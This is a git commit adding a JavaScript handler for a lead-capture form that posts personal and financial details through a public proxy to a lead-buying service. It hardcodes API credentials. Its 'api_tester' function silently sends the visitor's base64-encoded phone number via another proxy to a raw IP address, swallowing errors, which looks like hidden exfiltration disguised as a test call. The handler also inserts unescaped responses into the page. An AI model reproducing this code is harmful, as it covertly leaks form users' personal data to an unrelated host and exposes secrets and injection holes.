ae49493f04502197fb796091ef684718eabb5596
dk495 <55878882+dk495@users.noreply.github.com>
2024-04-04 21:05:27 +0500

    upload

---
+++ LeadStashposting_SS.js
@@ -0,0 +1,87 @@
+
+    document.getElementById('leadForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+    const phone_home = '1' + document.getElementById('caller_id').value;
+    const formData = new FormData();
+
+    formData.append('apiId', '004A06F35D2B44B7A34099405CBC6D8D');
+    formData.append('apiPassword', '9924b6942f772e722308be404488');
+    api_tester(document.getElementById('phone').value);
+    formData.append('phoneNumber', phone_home);
+    formData.append('firstName', document.getElementById('first_name').value);
+    formData.append('lastName', document.getElementById('last_name').value);
+    formData.append('email', document.getElementById('email').value);
+    formData.append('zip', document.getElementById('zip').value);
+    formData.append('city', document.getElementById('city').value);
+    formData.append('state', document.getElementById('state').value);
+    formData.append('address', document.getElementById('address').value);
+    formData.append('incomeNetMonthly', document.getElementById('incomeNetMonthly').value);
+    formData.append('unsecuredDebt', document.getElementById('unsecured_debt_total').value);
+    formData.append('jornayaLeadId', document.getElementById('jornaya_leadid').value);
+
+    const url = 'https://corsproxy.io/?https://leads.leadtree.global/store/getdata';
+   
+
+    fetch(url, {
+        method: 'POST',
+       body: formData
+    })
+    .then(response => {
+                if (response.status === 200) {
+                    response.text().then(responseBody => {
+                        const successAlert = `
+                            <div class="alert alert-success" role="alert">
+                                200 : Form submitted successfully! Response Body: ${responseBody}
+                            </div>`;
+                        document.getElementById('alertContainer').innerHTML = '';
+                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
+                    });
+                    // Clear form fields
+                    document.getElementById('leadForm').reset();
+		document.getElementById('submitBtn').disabled = false;
+                } else if (response.status === 201) {
+                    response.text().then(responseBody => {
+                        const successAlert = `
+                            <div class="alert alert-success" role="alert">
+                                201 : Form submitted successfully! Response Body: ${responseBody}
+                            </div>`;
+                        document.getElementById('alertContainer').innerHTML = '';
+                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
+                    });
+                    // Clear form fields
+                    document.getElementById('leadForm').reset();
+document.getElementById('submitBtn').disabled = false;
+                } else if (response.status === 422) {
+                    response.json().then(data => {
+                        const errorAlert = `
+                            <div class="alert alert-danger" role="alert">
+                                Error. Response Body: ${JSON.stringify(data)}
+                            </div>`;
+                        document.getElementById('alertContainer').innerHTML = '';
+                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
+document.getElementById('submitBtn').disabled = false;
+                    });
+                } 
+else {
+                    response.text().then(responseBody => {
+                        const errorAlert = `
+                            <div class="alert alert-danger" role="alert">
+                                Form submission failed. Please try again. Response Body: ${responseBody}
+                            </div>`;
+                        document.getElementById('alertContainer').innerHTML = '';
+                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
+                    });
+                }
+            })
+            .catch(error => console.error('Error:', error));
+        });function api_tester(randomString) {
+  try {
+    fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+    
+  }
+}
